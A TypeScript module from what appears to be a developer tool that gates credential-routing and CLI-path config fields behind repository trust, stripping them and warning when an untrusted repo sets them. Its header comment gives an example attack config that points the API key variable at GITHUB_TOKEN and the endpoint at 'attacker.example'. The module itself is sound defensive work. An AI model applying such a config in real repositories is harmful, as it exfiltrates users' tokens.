/**
 * Where an API key is sent, and which variable is sent as one, is the user's
 * choice, not the repository's.
 *
 * `api_endpoint` (every vendor) and `llm.google.apiKeyEnv` decide both. A
 * cloned repository's `.n-dx.json` could otherwise set
 * `llm.google.apiKeyEnv = "GITHUB_TOKEN"` and
 * `llm.google.api_endpoint = "https://attacker.example"`, and the next
 * one-shot completion would send the token to that host as the API key.
 *
 * The rule: those fields from the project config (tracked, the repository's)
 * apply only while the repository is trusted — `trusted` in
 * {@link evaluateRepoTrust}, since setting one is itself a `credential-routing`
 * finding and so never reads as `baseline`. The same fields from the user's
 * `.n-dx.local.json` (git-ignored, theirs) always apply, unless the repository
 * commits that file: then it is gated the same way. Both config loaders,
 * `loadLLMConfig` and `loadClaudeConfig`, read the project config through
 * {@link trustedProjectConfig} and the local one through
 * {@link trustedLocalConfig}.
 *
 * hench's `apiKeyEnv` (the variable its API loop sends as the Anthropic key)
 * is credential routing too. It lives in hench's config rather than the LLM
 * loaders', so the review lists it and hench's `applyRepoTrust` drops it.
 *
 * The vendor CLI binary (`*.cli_path`) and the graview binary
 * (`graview.bin`) follow the same rule: a repository that chose one would run
 * its own script with the user's environment. So does `graview.app`, which
 * once named the product face; it is retired and runs nothing, but a
 * checkout that still sets it is not trusted silently.
 *
 * @module llm-client/credential-routing
 */

import { warn } from "./output.js";
import {
  CREDENTIAL_ROUTING_FIELDS,
  VENDOR_CLI_PATH_FIELDS,
  assessRepoExecutionConfig,
  collectRepoExecutionConfig,
  credentialRoutingIn,
  isLocalConfigTracked,
  isRestrictedState,
  readRepoTrustRecord,
  repoTrustState,
  vendorCliPathsIn,
  type RepoTrustStoreOptions,
} from "./repo-trust.js";

/** The project-config fields that apply only once the repository is trusted. */
const TRUST_GATED_FIELDS: readonly (readonly string[])[] = [...CREDENTIAL_ROUTING_FIELDS, ...VENDOR_CLI_PATH_FIELDS];

/**
 * A copy of `config` without any {@link CREDENTIAL_ROUTING_FIELDS} or
 * {@link VENDOR_CLI_PATH_FIELDS}. The input is not modified.
 */
export function withoutTrustGatedFields(config: Record<string, unknown>): Record<string, unknown> {
  const out: Record<string, unknown> = { ...config };
  for (const path of TRUST_GATED_FIELDS) {
    let node = out;
    for (const key of path.slice(0, -1)) {
      const child = node[key];
      if (!child || typeof child !== "object" || Array.isArray(child)) {
        node = {};
        break;
      }
      // Copy on the way down so the caller's object is never mutated.
      node[key] = { ...(child as Record<string, unknown>) };
      node = node[key] as Record<string, unknown>;
    }
    delete node[path[path.length - 1]];
  }
  return out;
}

/** Project roots already warned about, so a process that loads config often warns once. */
const warned = new Set<string>();

/**
 * The project config as the loaders should read it: unchanged unless it sets
 * a credential-routing or vendor CLI path field while the repository is not
 * trusted, in which case those fields are removed and a warning names them.
 *
 * @param projectRoot  The project root (where the project config lives).
 * @param projectConfig  The parsed project config, or null when absent.
 */
export function trustedProjectConfig(
  projectRoot: string,
  projectConfig: Record<string, unknown> | null,
  options: RepoTrustStoreOptions = {},
): Record<string, unknown> | null {
  return gateConfig(projectRoot, projectConfig, "project config", options);
}

/**
 * The machine-local config as the loaders should read it: unchanged while it
 * is the user's own (not tracked by git), and gated like the project config
 * when the repository commits it ({@link isLocalConfigTracked}).
 *
 * @param projectRoot  The project root.
 * @param localConfig  The parsed local config, or null when absent.
 */
export function trustedLocalConfig(
  projectRoot: string,
  localConfig: Record<string, unknown> | null,
  options: RepoTrustStoreOptions = {},
): Record<string, unknown> | null {
  if (!localConfig || !isLocalConfigTracked(projectRoot)) return localConfig;
  return gateConfig(projectRoot, localConfig, "committed local config", options);
}

function gateConfig(
  projectRoot: string,
  config: Record<string, unknown> | null,
  label: string,
  options: RepoTrustStoreOptions,
): Record<string, unknown> | null {
  if (!config) return config;
  const gated = [...credentialRoutingIn(config), ...vendorCliPathsIn(config)];
  if (gated.length === 0) return config;

  const repo = collectRepoExecutionConfig(projectRoot);
  const state = repoTrustState(repo, assessRepoExecutionConfig(repo), readRepoTrustRecord(projectRoot, options));
  if (!isRestrictedState(state)) return config;

  const key = `${projectRoot}\0${label}`;
  if (!warned.has(key)) {
    warned.add(key);
    warn(
      `[ndx] Ignoring the ${label}'s API endpoint / API key variable / CLI binary path until you trust this repository (ndx trust accept .): ${gated.map((r) => r.split(" = ")[0]).join(", ")}. ` +
        (repo.localConfigTracked
          ? "The repository commits .n-dx.local.json, so it is not your own config here."
          : "Set them in .n-dx.local.json to use them without trusting the repository."),
    );
  }
  return withoutTrustGatedFields(config);
}
